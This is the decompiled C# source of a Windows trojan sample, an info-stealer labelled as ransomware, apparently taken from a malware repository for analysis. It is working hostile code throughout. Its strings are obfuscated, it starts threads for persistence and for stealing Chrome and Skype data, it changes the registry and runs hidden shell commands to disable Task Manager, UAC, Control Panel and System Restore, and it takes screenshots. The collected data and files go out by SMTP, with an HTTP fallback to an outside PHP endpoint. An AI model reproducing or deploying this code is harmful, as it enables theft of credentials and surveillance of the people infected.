// Decompiled with JetBrains decompiler
// Type: UGMVUKMJ
// Assembly: 222222, Version=7.75.26.79, Culture=neutral, PublicKeyToken=null
// MVID: 4BBEBC6C-8846-4FD8-8CBA-F3F42BFE498C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mxnf-86627272f15f9986eda96f2b9cf928cf060c453bafd8c484fce237fd3ff62a0a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

public class UGMVUKMJ
{
  public static string DWPWTIN;
  public static string UEULOCC;
  public static string VYBQXDK;
  public static string FFInfo;
  public static string MWFUQGC;
  public static string WMRCBXG;
  public static string WLFHTVH;
  public static string JVVKPFX;
  public static string HBIPKQS;
  public static string SFCGFYF;
  public static string QWHHTTK;
  public static string OGBHXCV;
  public static string EODHVRM;
  public static string CSHWCPM;
  public static string WMGVCEYV = "";
  public static string TTMSOEIM = UYGQQYLC.WEGPJNXO("kKi3ureQpL3Er5Omsba1VX+xvqSNq3i0spEj", "False");
  public static string USWETQWV = UYGQQYLC.WEGPJNXO("h6C2vbiRp6vDuYm4e4p8WiM=", "False");
  public static string WVKYNYLT = UYGQQYLC.WEGPJNXO("mq/BxHSOr669slWlvMEj", "False");
  public static int ICWOVUTX = 587;
  public static string DSABLETaskManager = UYGQQYLC.WEGPJNXO("USERTASK", "False");
  public static string DSABLEdCMD = UYGQQYLC.WEGPJNXO("USERCMD", "False");
  public static string DSABLERegistry = UYGQQYLC.WEGPJNXO("USERREG", "False");
  public static string DSABLEUAC = UYGQQYLC.WEGPJNXO("USERUAC", "False");
  public static string DSABLEFolderOptions = UYGQQYLC.WEGPJNXO("USERFOLDER", "False");
  public static string DSABLEControlPanel = UYGQQYLC.WEGPJNXO("USERCONTROL", "False");
  public static string DSABLESystemRestore = UYGQQYLC.WEGPJNXO("USERRESTORE", "False");
  public static string CUGHCWYH = UYGQQYLC.WEGPJNXO("DLEXSite", "False");
  public static string NJGFEPPV = UYGQQYLC.WEGPJNXO("USERSITE", "False");
  public static string DFQMHVIY = UYGQQYLC.WEGPJNXO("aLC7v7Qj", "False");
  public static string KTUPJPQO = UYGQQYLC.WEGPJNXO("abG8wLVeX3rJc1Rvg4l0VCM=", "False");
  public static string CVCEILLV = UYGQQYLC.WEGPJNXO("faq6t7SdtGymqpi3tbaqmWGvwrqSpWzBtJphuMKmimGZpohZc3qXkXJvbCM=", "False");
  public static string CWGCTBER = UYGQQYLC.WEGPJNXO("USERSCREENSHOTS", "False");
  public static string HVGGNPPD = UYGQQYLC.WEGPJNXO("bV+WoJlpX4yaikSBlpKGb1+NoIZvIw==", "False");
  public static int XKJBWMKX = 3000000;
  public static string HOCUMOKE = "";
  public static string SGGILSDL = "";
  public static int number = 0;
  public static WNKBHEQY CCEGKPHV;
  public static Thread VDKUHRKV = new Thread(new ThreadStart(UGMVUKMJ.BQPNBSIY));
  public static Thread GCThread = new Thread(new ThreadStart(DAChrome.GTCHRME));
  public static Thread LVGSWGYY = new Thread(new ThreadStart(UGMVUKMJ.HJIJGPRH));
  public static Thread STRTTHRD = new Thread(new ThreadStart(DAStartup.Startupdll.StartPers));
  public static Thread SkypeSPEDThread = new Thread(new ThreadStart(DASkypeSPED.SkypeSPEDll.GTSKPE));

  [STAThread]
  public static void Main()
  {
    int num1;
    try
    {
      Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5);
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      Thread.Sleep(5000);
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, "*.png*"))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      UGMVUKMJ.STRTTHRD.IsBackground = true;
      UGMVUKMJ.STRTTHRD.Start();
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    int num2 = 0;
    int num3;
    while (true)
    {
      num3 = 1;
      try
      {
        if (num2 == 3)
          Application.Restart();
        UGMVUKMJ.CCEGKPHV = new WNKBHEQY(UGMVUKMJ.SGGILSDL);
        WNKBHEQY.IGWEOPPR();
        break;
      }
      catch (Exception ex)
      {
        int lErl = num3;
        ProjectData.SetProjectError(ex, lErl);
        checked { ++num2; }
        ProjectData.ClearProjectError();
      }
    }
    try
    {
      UGMVUKMJ.VDKUHRKV.IsBackground = true;
      UGMVUKMJ.VDKUHRKV.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      string dfqmhviy = UGMVUKMJ.DFQMHVIY;
      if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("ltLc2gI=", "False"), false) == 0)
      {
        int num4 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.None);
      }
      else if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("h6zIy7ieshg=", "False"), false) == 0)
      {
        int num5 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      else if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("c8G3x66bqsjEvJwZ", "False"), false) == 0)
      {
        int num6 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      else if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("bqqwuC8=", "False"), false) == 0)
      {
        int num7 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("W6Ousqcw", "False"), false) == 0)
      {
        int num8 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("kdDL4NOpytQJ", "False"), false) == 0)
      {
        int num9 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.Question);
      }
      else if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("cKS8uSI=", "False"), false) == 0)
      {
        int num10 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("h9Tg2Nev1NcD", "False"), false) == 0)
      {
        int num11 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else if (Operators.CompareString(dfqmhviy, UYGQQYLC.WEGPJNXO("b6+ywreTosC8tJQh", "False"), false) == 0)
      {
        int num12 = (int) MessageBox.Show(UGMVUKMJ.CVCEILLV, UGMVUKMJ.KTUPJPQO, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else
      {
        int num13 = (int) MessageBox.Show(UYGQQYLC.WEGPJNXO("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), UYGQQYLC.WEGPJNXO("i7/H0cStv3yox6jAzhM=", "False"), MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      Process.Start(UGMVUKMJ.NJGFEPPV);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      UGMVUKMJ.GCThread.IsBackground = true;
      UGMVUKMJ.GCThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("k6SwpsWrgMHGEw==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("jZnAwcKgv8bExI2OuMG7przKuqKEjsbSfpWuFw==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("goa8vKhosMCvmIu1wLyzjbSotKiJsMHBuZkh", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("iZW8vb6cu8LAwImKtL23orjGtq2Qq8LPuqG7Gw==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("jZ640LVzu8u9kZSvxtO+pb+Fx76aFg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("lqLJysupyM/NzZaXwcrEr8XTw6ubx8WpyK60ocq8qcrO28xovs7QEA==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("hou5w66ErrzDqoa4ucuul6a+uLCPt37PtpYd", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("jprBwsOhwMfFxY6PucK8p73Lu5ebub3Zup65ubK6prLLjcmfuRY=", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (Operators.CompareString(UGMVUKMJ.DSABLETaskManager, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
        MyProject.Computer.Registry.SetValue(UYGQQYLC.WEGPJNXO("cY+Ur6dsmaGojXeYrqubbparqbePuMa3uo6gnL+rm7PCxa6doKa/to2zxsmkbLnByK2XuKW7upytvsSkebO7v6uSqcKym6K3w7u1HQ==", "False"), UYGQQYLC.WEGPJNXO("hcXaz8KtwbvP06ypzuAJ", "False"), (object) UYGQQYLC.WEGPJNXO("TCw=", "False"), RegistryValueKind.DWord);
      if (Operators.CompareString(UGMVUKMJ.DSABLEdCMD, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
        MyProject.Computer.Registry.SetValue(UYGQQYLC.WEGPJNXO("ZoSJpJxhjpadgmyNo6CQY4ugnqyErbusr4OVlLqph5ytsLB6hq2ur42ss7GxepCtuaGNsLenkJesuLCqKA==", "False"), UYGQQYLC.WEGPJNXO("c7PIvbCbr5ipkhc=", "False"), (object) UYGQQYLC.WEGPJNXO("TCw=", "False"), RegistryValueKind.DWord);
      if (Operators.CompareString(UGMVUKMJ.DSABLERegistry, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
        MyProject.Computer.Registry.SetValue(UYGQQYLC.WEGPJNXO("h6Wqxb2Cr7e+o42uxMGxhKzBv82lztzN0KS2stXBscnY28SztrzVzKPJ3N+6gs/X3sOtzrvR0LLD1Nq6j8nR1cGov9jIsbjN2dHLBw==", "False"), UYGQQYLC.WEGPJNXO("a6vAtaiTp5+5rZC1wca/e7G8wLkf", "False"), (object) UYGQQYLC.WEGPJNXO("TCw=", "False"), RegistryValueKind.DWord);
      if (Operators.CompareString(UGMVUKMJ.DSABLEUAC, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
        Interaction.Shell(UYGQQYLC.WEGPJNXO("ipzJy8+1xtzr2aO15ufarM+gpsKqz9Giy7/HjaPRZ4fk3dSry9+Zwprb4OjLtJWf0NisyZvZ3qyCrriqZ6q4wLOjtby6up6jv7nClMvQ5tW60dPowp7L29jVvtXJt9u51NLi2p3H3+fPttDJxNWzy9Ddy7q+wO3Zu8falJW9grLix6nO0sC7iIKc6IaZp7TTqp6xv7iGdsaNpIZ2yAE=", "False"), AppWinStyle.Hide);
      if (Operators.CompareString(UGMVUKMJ.DSABLEFolderOptions, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
        Interaction.Shell(UYGQQYLC.WEGPJNXO("cH6La56CnWSTiGGOoJ6shK27rK+DlZG0oJCot7qjkpWbtKuCqLu+mWGutr2ijK2asK+RorO5mW6osLSgh563p4KWqbC6r4OrZHqzPoezkayKnam9jI6trbqrkVlzv11wfouqgXWIlo9dTZ1kfF1Nnyo=", "False"));
      if (Operators.CompareString(UGMVUKMJ.DSABLEControlPanel, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
        Interaction.Shell(UYGQQYLC.WEGPJNXO("a3mGZpl9mF+Og1yJm5mnf6i2p6p+kIyvm4ujsrWejZCWr6Z9o7a5lFypsbidh6iVq6qMna60lGmjq6+bgpmyon2RpKu1qn6mX3WuOYKuiaeHqLG1pGmVraukOWOzZopee56Kj2iGg2ZnfVRwZmd/Lg==", "False"), AppWinStyle.Hide);
      if (Operators.CompareString(UGMVUKMJ.DSABLESystemRestore, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
        MyProject.Computer.Registry.SetValue(UYGQQYLC.WEGPJNXO("h6Wqxb2Lqaitqp6npq+miKiqyLGOoLnDn5GfwbnHoszU382lzsHDx62+1OPRX6i5yKG0zNfRzLOwyt7RqMnTyLG4zdnRy5G/2ODNsb8J", "False"), UYGQQYLC.WEGPJNXO("jc3i18q1ycLIAQ==", "False"), (object) UYGQQYLC.WEGPJNXO("TCw=", "False"), RegistryValueKind.DWord);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      UGMVUKMJ.SkypeSPEDThread.IsBackground = true;
      UGMVUKMJ.SkypeSPEDThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      UGMVUKMJ.LVGSWGYY.IsBackground = true;
      UGMVUKMJ.LVGSWGYY.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().WaitForExit();
  }

  public static void BQPNBSIY()
  {
    while (true)
    {
      Thread.Sleep(UGMVUKMJ.XKJBWMKX);
      string str1 = "";
      Thread.Sleep(100);
      string str2;
      try
      {
        WebClient webClient = new WebClient();
        str2 = UYGQQYLC.WEGPJNXO("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(UYGQQYLC.WEGPJNXO("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + UYGQQYLC.WEGPJNXO("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = "";
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(500);
      try
      {
        if (Operators.CompareString(UGMVUKMJ.CWGCTBER, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
        {
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
          bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + UGMVUKMJ.number.ToString() + UYGQQYLC.WEGPJNXO("ZsPMzBI=", "False"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(200);
      try
      {
        if (Operators.CompareString(UGMVUKMJ.SGGILSDL, "", false) != 0)
        {
          UGMVUKMJ.HOCUMOKE = UGMVUKMJ.SGGILSDL + Environment.NewLine + Environment.NewLine + str2 + Environment.NewLine + Environment.NewLine + str1;
          try
          {
            MailMessage message = new MailMessage();
            MailMessage mailMessage = message;
            mailMessage.From = new MailAddress(UGMVUKMJ.TTMSOEIM);
            mailMessage.To.Add(UGMVUKMJ.TTMSOEIM);
            mailMessage.Subject = UYGQQYLC.WEGPJNXO("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + UYGQQYLC.WEGPJNXO("aQ0=", "False") + Environment.MachineName.ToString();
            mailMessage.Body = UGMVUKMJ.HOCUMOKE;
            try
            {
              if (Operators.CompareString(UGMVUKMJ.CWGCTBER, UYGQQYLC.WEGPJNXO("mNHf1gY=", "False"), false) == 0)
              {
                Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + UGMVUKMJ.number.ToString() + UYGQQYLC.WEGPJNXO("ZsPMzBI=", "False"));
                mailMessage.Attachments.Add(attachment);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            new SmtpClient(UGMVUKMJ.WVKYNYLT)
            {
              Port = UGMVUKMJ.ICWOVUTX,
              EnableSsl = true,
              Credentials = ((ICredentialsByHost) new NetworkCredential(UGMVUKMJ.TTMSOEIM, UGMVUKMJ.USWETQWV))
            }.Send(message);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            try
            {
              HttpWebResponse response = (HttpWebResponse) WebRequest.Create("http://lls.3owl.com/zztop.php" + "?to=" + UGMVUKMJ.TTMSOEIM + "&subject=" + Strings.Replace(UYGQQYLC.WEGPJNXO("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + UYGQQYLC.WEGPJNXO("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(UGMVUKMJ.HOCUMOKE, " ", "%20") + "&from=" + UGMVUKMJ.TTMSOEIM).GetResponse();
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      UGMVUKMJ.HOCUMOKE = "";
      UGMVUKMJ.SGGILSDL = "";
      UGMVUKMJ.WMGVCEYV = "";
      checked { ++UGMVUKMJ.number; }
    }
  }

  public static void HJIJGPRH()
  {
    int length = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("eoatrq+NrLOxsXp7pa6ok6m3pyw=", UYGQQYLC.WEGPJNXO("g7nP3cEJ", "False"))).Length;
    FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("eoatrq+NrLOxsXp7pa6ok6m3pyw=", UYGQQYLC.WEGPJNXO("g7nP3cEJ", "False"))).GetFiles();
    try
    {
      Thread.Sleep(25000);
      string str = UGMVUKMJ.DWPWTIN.ToString() + Environment.NewLine + Environment.NewLine + UGMVUKMJ.UEULOCC + Environment.NewLine + Environment.NewLine + UGMVUKMJ.VYBQXDK + Environment.NewLine + Environment.NewLine + UGMVUKMJ.MWFUQGC + Environment.NewLine + Environment.NewLine + UGMVUKMJ.WMRCBXG + Environment.NewLine + Environment.NewLine + UGMVUKMJ.WLFHTVH + Environment.NewLine + Environment.NewLine + UGMVUKMJ.JVVKPFX + Environment.NewLine + Environment.NewLine + UGMVUKMJ.HBIPKQS + Environment.NewLine + Environment.NewLine + UGMVUKMJ.QWHHTTK + Environment.NewLine + Environment.NewLine + UGMVUKMJ.OGBHXCV + Environment.NewLine + Environment.NewLine + UGMVUKMJ.EODHVRM + Environment.NewLine + Environment.NewLine + UGMVUKMJ.CSHWCPM;
      if (Operators.CompareString(str, "", false) != 0 | Operators.CompareString(str, (string) null, false) != 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          MailMessage mailMessage = message;
          mailMessage.From = new MailAddress(UGMVUKMJ.TTMSOEIM);
          mailMessage.To.Add(UGMVUKMJ.TTMSOEIM);
          mailMessage.Subject = UYGQQYLC.WEGPJNXO("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + UYGQQYLC.WEGPJNXO("aQ0=", UYGQQYLC.WEGPJNXO("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
          mailMessage.Body = str;
          try
          {
            FileInfo[] fileInfoArray = files;
            int index = 0;
            while (index < fileInfoArray.Length)
            {
              Attachment attachment = new Attachment(fileInfoArray[index].FullName);
              mailMessage.Attachments.Add(attachment);
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          new SmtpClient(UGMVUKMJ.WVKYNYLT)
          {
            Port = UGMVUKMJ.ICWOVUTX,
            EnableSsl = true,
            Credentials = ((ICredentialsByHost) new NetworkCredential(UGMVUKMJ.TTMSOEIM, UGMVUKMJ.USWETQWV))
          }.Send(message);
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          try
          {
            HttpWebResponse response = (HttpWebResponse) WebRequest.Create("http://lls.3owl.com/zztop.php" + "?to=" + UGMVUKMJ.TTMSOEIM + "&subject=" + Strings.Replace(UYGQQYLC.WEGPJNXO("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + UYGQQYLC.WEGPJNXO("aQ0=", UYGQQYLC.WEGPJNXO("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(str, " ", "%20") + "&from=" + UGMVUKMJ.TTMSOEIM).GetResponse();
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Application.Exit();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
